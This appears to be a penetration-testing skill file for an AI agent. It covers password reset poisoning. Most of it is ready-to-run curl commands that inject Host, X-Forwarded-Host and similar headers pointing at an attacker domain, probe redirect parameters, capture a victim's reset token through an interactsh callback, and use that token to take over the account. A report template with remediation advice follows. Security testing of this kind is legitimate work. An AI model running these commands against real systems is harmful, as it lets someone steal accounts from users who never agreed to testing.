---
name: vuln-password-reset-poisoning
description: "Password reset poisoning via Host header injection and redirect parameter manipulation. Causes reset emails with attacker-controlled URLs. Triggers: 'password reset poisoning', 'host header injection', 'reset link manipulation', 'password reset attack', 'x-forwarded-host injection', 'account takeover password reset', 'forgot password injection'."
---

# Password Reset Poisoning

Inject Host header or redirect parameter into password reset flow to poison reset emails.

---

## Phase 1: Map Reset Flow

```bash
TARGET="https://TARGET"

for path in /reset /forgot /password/reset /account/forgot /user/password-reset; do
  code=$(curl -so /dev/null -w '%{http_code}' "$TARGET$path")
  echo "$code $path"
done

# Capture normal reset request (use Burp/ZAP):

#

```

---

## Phase 2: Host Header Injection

```bash
TARGET="https://TARGET"
RESET_ENDPOINT="/forgot-password"
ATTACKER_DOMAIN="attacker.com"
TEST_EMAIL="your-controlled@email.com"

curl -s -X POST "$TARGET$RESET_ENDPOINT" \
  -H "Host: $ATTACKER_DOMAIN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=$TEST_EMAIL"

curl -s -X POST "$TARGET$RESET_ENDPOINT" \
  -H "X-Forwarded-Host: $ATTACKER_DOMAIN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=$TEST_EMAIL"

curl -s -X POST "$TARGET$RESET_ENDPOINT" \
  -H "X-Host: $ATTACKER_DOMAIN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=$TEST_EMAIL"

curl -s -X POST "$TARGET$RESET_ENDPOINT" \
  -H "X-Original-URL: https://$ATTACKER_DOMAIN$RESET_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=$TEST_EMAIL"
```

---

## Phase 3: Redirect Parameter Injection

```bash
TARGET="https://TARGET"
ATTACKER_URL="https://attacker.com/capture"

REDIRECT_PARAMS=("redirect" "callback" "next" "return" "returnUrl" "goto" "continue" "redir" "redirect_uri")

for param in "${REDIRECT_PARAMS[@]}"; do
  echo "=== Testing: $param ==="
  curl -sI "$TARGET/forgot-password?$param=$ATTACKER_URL" \
    -X POST -d "email=test@test.com" | grep -iE "location|set-cookie"
done

curl -sI "$TARGET/reset?token=abc123&redirect=$ATTACKER_URL"

```

---

## Phase 4: Validation & Evidence

```bash
# Use interactsh or Burp Collaborator to capture:
# 1. Start collaborator/interactsh listener
# 2. Use callback domain in Host header injection
# 3. Trigger reset for victim@target.com
# 4. Monitor for HTTP requests containing token parameter

./interactsh-client -server interactsh.com -n 1
# → gives you: abc.interactsh.com

curl -s -X POST "$TARGET/forgot-password" \
  -H "Host: abc.interactsh.com" \
  -d "email=victim@target.com"

# If captured → account takeover via:
curl -s "$TARGET/reset?token=VICTIM_TOKEN" \
  -X POST -d "password=NewPassword123!"
```

---

## Report Template

```markdown
## Password Reset Poisoning

**Severity:** High / Critical (depending on exploitability)
**CWE:** CWE-640 (Weak Password Recovery Mechanism)

**Finding:** The password reset endpoint trusts the `Host` header to build the
reset URL. By injecting `X-Forwarded-Host: attacker.com`, the reset email
sent to the victim contains a link pointing to the attacker's domain.

**Attack Chain:**
1. Attacker requests password reset for victim@target.com
2. Attacker injects `X-Forwarded-Host: attacker.com` in the POST request
3. Application generates reset link: `https://attacker.com/reset?token=VICTIM_TOKEN`
4. Victim receives email, clicks link, attacker captures token from server logs
5. Attacker uses captured token to set new password and take over account

**PoC Request:**
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
...email=victim@target.com

**Evidence:** [attach screenshot of email/token capture]

**Recommendations:**
1. Build reset URLs using a hardcoded server-side base URL
2. Reject/strip `X-Forwarded-Host` unless from trusted proxy
3. Validate redirect parameters against an allowlist
```

---

## Output

Save to `.omop/engagement/vuln/password-reset/`:
- `reset-request.txt` — poisoned reset request
- `captured-token.txt` — evidence of token capture (interactsh)
- `account-takeover-poc.txt` — token usage demonstration

## Next Phase

→ `pentest-report` for final report
→ `vuln-oauth` for related account takeover via OAuth
